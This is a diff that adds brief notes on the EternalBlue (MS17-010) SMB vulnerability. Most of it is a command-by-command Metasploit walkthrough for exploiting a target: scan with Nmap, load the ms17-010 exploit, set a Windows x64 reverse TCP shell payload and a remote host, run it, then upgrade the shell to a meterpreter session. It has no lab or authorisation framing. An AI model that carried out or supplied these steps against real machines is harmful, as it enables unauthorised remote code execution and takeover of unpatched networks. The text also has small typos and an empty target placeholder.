@@ -1,0 +1,38 @@
+
+EternalBlue is an exploit that allows cyber threat actors to remotely execute arbitrary code and
+gain access to a network by sending specially crafted packets.EternalBlue exploits a vulnerability
+in the Microsoft implementation of the Server Message Block (SMB) Protocol. This dupes a Windows machine
+that has not been patched against the vulnerability into allowing illegitimate data packets into the legitimate network
+Due to EternalBlue’s ability to compromise networks, if one device is infected by malware
+via EternalBlue, every device connected to the network is at risk. This makes recovery difficult,
+as all devices on a network may have to be taken offline for remediation.
+===========
+Use Nmap for finding any network with openports
+Open Terminal and run the command
+ Msfconsole
+With Metasploit running, the first step is to search for the vulnerability or exploit we’re
+interested in. In our case, we know our target is running SMB.
+ search ms17-010 type:exploit
+ use 0
+
+show options 
+
+set payload windows/x64/shell/reverse_tcp
+set rhost <>
+
+run
+
+whoami
+<coberting to meterpreter>
+
+background 
+
+search shell_to_meterpreter
+
+use 0
+
+sessions -l
+
+set SESSION 2
+
+run
